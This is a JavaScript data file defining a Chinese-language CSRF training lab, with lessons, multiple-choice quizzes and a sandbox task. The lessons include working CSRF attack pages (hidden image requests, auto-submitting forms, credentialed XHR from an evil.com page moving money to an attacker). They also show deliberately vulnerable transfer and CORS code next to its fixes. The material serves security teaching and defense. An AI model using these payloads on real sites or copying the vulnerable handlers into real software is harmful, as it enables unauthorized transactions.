// CSRF跨站请求伪造实验模拟数据
export const CSRFExperiment = {
  id: 3,
  name: 'CSRF跨站请求伪造实验',
  introduction: '本实验将帮助你理解CSRF跨站请求伪造攻击的原理和防御方法',
  difficulty: 2,
  taskPoints: [
    {
      id: 1,
      name: 'CSRF基础概念',
      description: '学习CSRF跨站请求伪造的基本原理和攻击流程',
      score: 5,
      document: '## CSRF基础概念\n\nCSRF（Cross-Site Request Forgery，跨站请求伪造）是一种常见的Web安全漏洞，攻击者诱导已认证用户在不知情的情况下执行非本意的操作，利用的是用户已经获取的身份认证信息（如Cookie）。\n\n### CSRF攻击原理\n\n1. 用户登录目标网站A，获得身份认证（通常存储在Cookie中）\n2. 用户在未登出网站A的情况下访问恶意网站B\n3. 恶意网站B包含针对网站A的请求代码\n4. 当用户浏览恶意网站B时，浏览器会自动发送针对网站A的请求，并附带用户的Cookie\n5. 网站A无法区分这个请求是用户主动发起的还是被诱导的，因此执行了该操作\n\n### CSRF攻击的特点\n\n- 攻击者不需要获取用户的Cookie或任何认证信息\n- 攻击者无法查看响应内容，只能诱导用户执行操作\n- 攻击通常针对有副作用的操作，如修改密码、转账、发表评论等\n- 依赖用户已登录目标网站的状态',
      questions: [
        {
          id: 1,
          content: 'CSRF攻击的全称是什么？',
          score: 2,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['Cross-Site Request Forgery', 'Cross-Server Resource Fetch', 'Client-Side Redirection Failure', 'Content Security Risk Factor']
        },
        {
          id: 2,
          content: 'CSRF攻击成功的先决条件是什么？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['攻击者获取到用户密码', '用户已登录目标网站且会话有效', '目标网站使用HTTP协议', '用户点击确认按钮']
        }
      ]
    },
    {
      id: 2,
      name: 'CSRF攻击方式',
      description: '学习不同类型的CSRF攻击实现方式',
      score: 7,
      document: '## CSRF攻击方式\n\nCSRF攻击可以通过多种方式实现，主要取决于目标操作的请求方式（GET或POST）以及应用的安全措施。\n\n### GET方式的CSRF攻击\n\n最简单的CSRF攻击利用GET请求，例如：\n\n```html\n<!-- 攻击者的恶意网页 -->\n<img src="https://bank.example/transfer?to=attacker&amount=1000" style="display:none">\n```\n\n当受害用户访问包含此代码的页面时，浏览器会尝试加载这个"图片"，实际上向银行网站发送了一个转账请求。\n\n### POST方式的CSRF攻击\n\n针对只接受POST请求的操作，攻击者可以创建自动提交的表单：\n\n```html\n<!-- 攻击者的恶意网页 -->\n<body onload="document.forms[0].submit()">\n  <form action="https://bank.example/transfer" method="POST">\n    <input type="hidden" name="to" value="attacker">\n    <input type="hidden" name="amount" value="1000">\n  </form>\n</body>\n```\n\n### XMLHttpRequest方式\n\n使用JavaScript发起请求：\n\n```javascript\nvar xhr = new XMLHttpRequest();\nxhr.open("POST", "https://bank.example/transfer");\nxhr.withCredentials = true; // 关键：发送跨域请求时携带Cookie\nxhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\nxhr.send("to=attacker&amount=1000");\n```\n\n然而，由于同源策略的限制，这种方式通常需要目标网站配置了不当的CORS（跨源资源共享）策略才能成功。\n\n### JSON CSRF攻击\n\n针对接受JSON格式数据的API：\n\n```html\n<script>\nfunction submitForm() {\n  var formData = new FormData();\n  formData.append("json", JSON.stringify({to: "attacker", amount: 1000}));\n  \n  var xhr = new XMLHttpRequest();\n  xhr.open("POST", "https://bank.example/api/transfer");\n  xhr.withCredentials = true;\n  xhr.send(formData);\n}\n</script>\n<body onload="submitForm()">\n</body>\n```\n\n### 利用Flash、Silverlight等插件\n\n在过去，一些Web插件可能会绕过同源策略的限制，增加CSRF攻击的可能性。现在这些插件已经逐渐被淘汰。',
      questions: [
        {
          id: 1,
          content: 'GET型CSRF攻击通常使用什么HTML元素来发起请求？',
          score: 3,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['<script>标签', '<img>标签', '<button>标签', '<div>标签']
        },
        {
          id: 2,
          content: '为什么XMLHttpRequest方式的CSRF攻击通常较难成功？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['因为它需要用户交互', '因为同源策略的限制', '因为它不能发送Cookie', '因为它只能发送GET请求']
        }
      ]
    },
    {
      id: 3,
      name: 'CSRF防御技术',
      description: '学习防御CSRF攻击的主要技术和最佳实践',
      score: 8,
      document: '## CSRF防御技术\n\n防御CSRF攻击有多种方法，最佳实践是组合使用多种防御机制。\n\n### CSRF Token\n\n最有效的防御方法是在每个表单中添加一个随机生成的令牌（Token）：\n\n1. 服务器为每个会话生成一个唯一的CSRF Token\n2. 将Token嵌入表单\n3. 提交表单时验证Token的有效性\n\n```html\n<!-- 服务器端生成的表单 -->\n<form action="/transfer" method="post">\n  <input type="hidden" name="csrf_token" value="随机生成的令牌">\n  <input type="text" name="amount">\n  <button type="submit">转账</button>\n</form>\n```\n\n```python\n# 服务器端验证\nif request.form["csrf_token"] != session["csrf_token"]:\n    return "CSRF攻击检测，请求被拒绝"\n```\n\n### 验证Referer头\n\n检查请求的来源：\n\n```python\nreferer = request.headers.get("Referer")\nif not referer or not referer.startswith("https://yourwebsite.com"):\n    return "可疑请求被拒绝"\n```\n\n这种方法简单但不完全可靠，因为Referer可能被浏览器或网络设备移除。\n\n### SameSite Cookie属性\n\n现代浏览器支持SameSite Cookie属性，可以限制Cookie在跨站请求中的发送：\n\n```\nSet-Cookie: sessionid=abc123; SameSite=Strict;\n```\n\n- `Strict`: 仅在同站请求中发送Cookie\n- `Lax`: 在同站请求和导航到该网站的跨站GET请求中发送Cookie（现代浏览器的默认值）\n- `None`: 在所有请求中发送Cookie，必须同时设置Secure属性\n\n### 双重Cookie验证\n\n在请求参数中包含一部分Cookie值，服务器对比此值与实际Cookie：\n\n```javascript\n// 客户端JavaScript\nvar csrfCookie = getCookie("csrfCookie");\ndocument.getElementById("csrfField").value = csrfCookie;\n```\n\n### 验证码\n\n对敏感操作增加验证码，要求用户交互：\n\n```html\n<form action="/transfer" method="post">\n  <input type="text" name="amount">\n  <img src="/captcha">\n  <input type="text" name="captcha_response">\n  <button type="submit">转账</button>\n</form>\n```\n\n### 其他安全实践\n\n1. 敏感操作使用POST而非GET\n2. 避免自动完成敏感表单\n3. 为敏感操作添加二次确认\n4. 设置合理的会话超时时间\n5. 实现登出功能',
      questions: [
        {
          id: 1,
          content: '以下哪种方法被认为是防御CSRF攻击最有效的方法？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['使用HTTPS协议', '实现CSRF Token机制', '禁用JavaScript', '缩短会话有效期']
        },
        {
          id: 2,
          content: 'SameSite Cookie属性设置为"Strict"时意味着什么？',
          score: 4,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['Cookie在所有请求中都会发送', 'Cookie永远不会发送', 'Cookie只在同站请求中发送', 'Cookie在1小时后过期']
        }
      ]
    },
    {
      id: 4,
      name: 'CSRF实例分析',
      description: '通过真实案例分析CSRF攻击的过程和防御',
      score: 10,
      document: '## CSRF实例分析\n\n通过分析一些真实的CSRF攻击案例，我们可以更好地理解攻击的过程和防御方法。\n\n### 案例一：简单的转账CSRF攻击\n\n**目标网站代码：**\n\n```html\n<!-- bank.com/transfer.html -->\n<form action="/api/transfer" method="POST">\n  <input type="text" name="to" placeholder="收款账号">\n  <input type="text" name="amount" placeholder="金额">\n  <button type="submit">转账</button>\n</form>\n```\n\n```javascript\n// bank.com/api/transfer处理代码\napp.post("/api/transfer", function(req, res) {\n  if (req.session.loggedIn) {\n    // 直接处理转账，没有任何CSRF防护\n    transferMoney(req.session.userId, req.body.to, req.body.amount);\n    res.send("转账成功");\n  } else {\n    res.status(403).send("请先登录");\n  }\n});\n```\n\n**攻击者的恶意网站：**\n\n```html\n<!-- evil.com/free-gift.html -->\n<h1>免费礼品！点击领取</h1>\n<img src="gift.jpg" width="300">\n\n<iframe style="display:none" name="csrf-frame"></iframe>\n<form action="https://bank.com/api/transfer" method="POST" target="csrf-frame" id="csrf-form">\n  <input type="hidden" name="to" value="攻击者账号">\n  <input type="hidden" name="amount" value="10000">\n</form>\n\n<script>\n  document.getElementById("csrf-form").submit();\n</script>\n```\n\n**攻击过程：**\n\n1. 用户已登录bank.com并获得了有效的会话Cookie\n2. 用户访问evil.com上的"免费礼品"页面\n3. 页面自动提交隐藏表单到bank.com\n4. 浏览器发送请求时附带了bank.com的Cookie\n5. bank.com验证用户已登录，执行转账操作\n6. 用户资金被转移到攻击者账号\n\n**防御措施：**\n\n```html\n<!-- 改进后的bank.com/transfer.html -->\n<form action="/api/transfer" method="POST">\n  <input type="hidden" name="csrf_token" value="<%=csrfToken%>">\n  <input type="text" name="to" placeholder="收款账号">\n  <input type="text" name="amount" placeholder="金额">\n  <button type="submit">转账</button>\n</form>\n```\n\n```javascript\n// 改进后的处理代码\napp.post("/api/transfer", function(req, res) {\n  if (req.session.loggedIn) {\n    // 验证CSRF Token\n    if (req.body.csrf_token !== req.session.csrfToken) {\n      return res.status(403).send("CSRF验证失败");\n    }\n    \n    // 添加额外的安全措施 - 请求频率限制\n    if (isRateLimited(req.session.userId)) {\n      return res.status(429).send("请求过于频繁，请稍后再试");\n    }\n    \n    // 添加额外的安全措施 - 转账金额限制\n    if (req.body.amount > 5000) {\n      return res.status(400).send("单笔转账金额不能超过5000");\n    }\n    \n    // 处理转账\n    transferMoney(req.session.userId, req.body.to, req.body.amount);\n    res.send("转账成功");\n  } else {\n    res.status(403).send("请先登录");\n  }\n});\n```\n\n### 案例二：利用网站配置不当的CORS策略\n\n**目标网站API：**\n\n```javascript\n// api.bank.com/transfer处理代码\napp.use(function(req, res, next) {\n  // 配置不当的CORS策略\n  res.header("Access-Control-Allow-Origin", "*");\n  res.header("Access-Control-Allow-Headers", "Content-Type");\n  res.header("Access-Control-Allow-Credentials", "true"); // 允许跨域发送Cookie\n  next();\n});\n\napp.post("/transfer", function(req, res) {\n  // API使用Cookie进行认证\n  if (req.cookies.sessionId) {\n    transferMoney(req.cookies.userId, req.body.to, req.body.amount);\n    res.json({success: true});\n  } else {\n    res.status(403).json({error: "未认证"});\n  }\n});\n```\n\n**攻击者的恶意网站：**\n\n```html\n<!-- evil.com/win-prize.html -->\n<h1>恭喜您中奖了！点击领取</h1>\n\n<script>\ndocument.addEventListener("DOMContentLoaded", function() {\n  var xhr = new XMLHttpRequest();\n  xhr.open("POST", "https://api.bank.com/transfer", true);\n  xhr.withCredentials = true; // 关键：发送跨域请求时携带Cookie\n  xhr.setRequestHeader("Content-Type", "application/json");\n  xhr.send(JSON.stringify({\n    to: "攻击者账号",\n    amount: 10000\n  }));\n});\n</script>\n```\n\n**攻击过程：**\n\n1. 用户已登录bank.com并获得了有效的Cookie\n2. 用户访问evil.com上的恶意页面\n3. 页面通过XMLHttpRequest向api.bank.com发送POST请求\n4. 由于目标网站配置了`Access-Control-Allow-Origin: *`和`Access-Control-Allow-Credentials: true`，浏览器允许发送请求并附带Cookie\n5. API服务器验证Cookie有效，执行转账操作\n\n**防御措施：**\n\n```javascript\n// 修复CORS配置\napp.use(function(req, res, next) {\n  // 不允许通配符与credentials共存\n  const origin = req.headers.origin;\n  if (origin && allowedOrigins.includes(origin)) {\n    res.header("Access-Control-Allow-Origin", origin);\n    res.header("Access-Control-Allow-Credentials", "true");\n  } else {\n    res.header("Access-Control-Allow-Origin", "null");\n  }\n  next();\n});\n\n// 添加CSRF Token验证\napp.post("/transfer", function(req, res) {\n  if (!req.cookies.sessionId) {\n    return res.status(403).json({error: "未认证"});\n  }\n  \n  // 验证CSRF Token\n  const csrfToken = req.headers["x-csrf-token"];\n  if (!csrfToken || !validateCsrfToken(req.cookies.sessionId, csrfToken)) {\n    return res.status(403).json({error: "CSRF验证失败"});\n  }\n  \n  transferMoney(req.cookies.userId, req.body.to, req.body.amount);\n  res.json({success: true});\n});\n```\n\n### 总结\n\nCSRF攻击利用的是Web应用对用户身份验证的信任机制。通过这些案例分析，我们可以看到：\n\n1. 正确实现CSRF防御需要多层保护\n2. CSRF Token是最有效的防御措施\n3. 正确配置CORS策略对于保护API安全至关重要\n4. 安全的表单设计和用户交互可以进一步减轻风险',
      questions: [
        {
          id: 1,
          content: '在第一个案例中，攻击者是如何绕过用户登录验证的？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['攻击者窃取了用户的密码', '攻击者破解了会话机制', '攻击者利用了用户已登录的状态', '攻击者修改了服务器响应']
        },
        {
          id: 2,
          content: '在第二个案例中，什么配置错误使CSRF攻击成为可能？',
          score: 5,
          requiresTarget: false,
          type: 'multiple-choice',
          options: ['设置了过长的会话超时时间', '配置不当的CORS策略', '没有使用HTTPS', '服务器防火墙配置错误']
        }
      ]
    },
    {
      id: 5,
      name: 'CSRF实验环境',
      description: '在靶机环境中实践CSRF攻击的识别和利用',
      score: 10,
      document: `# CSRF实验环境

## 实验简介

本实验环境提供了一个简单的用户设置修改系统，你将在这个环境中学习如何识别CSRF漏洞，并尝试构造攻击页面来利用这些漏洞。

**注意：本实验环境仅用于教育目的。** 所有操作都在受控环境中进行，这些技术在未经授权的情况下使用是违法的。

## 实验目标

1. 理解CSRF漏洞的原理
2. 学习如何识别易受CSRF攻击的功能
3. 掌握构造CSRF攻击页面的基本技术
4. 了解CSRF漏洞的防御方法

## 实验环境说明

实验环境包含：
- 一个模拟的用户设置页面
- 修改邮箱和密码的功能
- 一个可以构造攻击页面的编辑器
- 一个模拟的受害者浏览器

## 实验步骤

### 第一步：理解应用功能

1. 登录应用并熟悉用户设置页面
2. 观察修改邮箱和密码的HTTP请求格式
3. 检查是否存在CSRF防护措施（如CSRF Token）

### 第二步：分析漏洞

1. 确定哪些功能缺乏CSRF防护
2. 分析请求方式（GET或POST）和参数
3. 确认会话Cookie的处理方式

### 第三步：构造CSRF攻击

1. 在攻击页面编辑器中创建HTML页面
2. 根据目标请求的类型（GET或POST）构造相应的攻击代码
3. 确保攻击代码能够自动执行，无需用户交互

### 第四步：测试攻击

1. 将攻击页面提交给模拟的受害者浏览器
2. 观察受害者的账户设置是否被修改
3. 分析攻击成功或失败的原因

## 实验小贴士

- 对于GET请求，可以使用img标签构造攻击
- 对于POST请求，可以使用自动提交的表单
- 如果目标站点有基本的CSRF防护，考虑是否存在绕过方法
- 注意观察请求和响应的完整内容，可能包含有用的信息

## 实验评分标准

实验评分基于以下几个方面：
1. 成功识别CSRF漏洞（3分）
2. 成功构造有效的CSRF攻击页面（3分）
3. 成功修改目标账户设置（4分）

## 安全提醒

请记住：
- CSRF攻击在实际网站上未经授权是违法的
- 负责任地披露发现的漏洞
- 将所学知识用于构建更安全的应用程序

现在，开始你的实验吧！`,
      questions: [
        {
          id: 1,
          content: '请描述CSRF攻击的基本原理 (在本前端模拟实验的上下文中)',
          score: 3,
          requiresTarget: false,
          type: 'open-ended-without-answer'
        },
        {
          id: 2,
          content: "以下哪种HTML代码最可能用于进行一次成功的CSRF攻击？",
          score: 3,
          requiresTarget: false,
          type: 'single-choice',
          options: [
            '<img src="https://bank.example/transfer?to=attacker&amount=1000" style="display:none">',
            '<script>alert("You have been hacked!")</script>',
            '<a href="https://bank.example/transfer?to=attacker&amount=1000">Click here</a>',
            '<input type="text" name="username" value="admin">'
          ]
        },
        {
          id: 3,
          content: '请构造一个有效的CSRF攻击页面，修改用户的电子邮箱地址。请写出你使用的HTML代码。',
          score: 4,
          requiresTarget: false,
          type: 'open-ended-with-answer'
        }
      ]
    }
  ],
  targetMachine: {
    id: '550e8400-e29b-41d4-a716-446655440002'
  }
}; 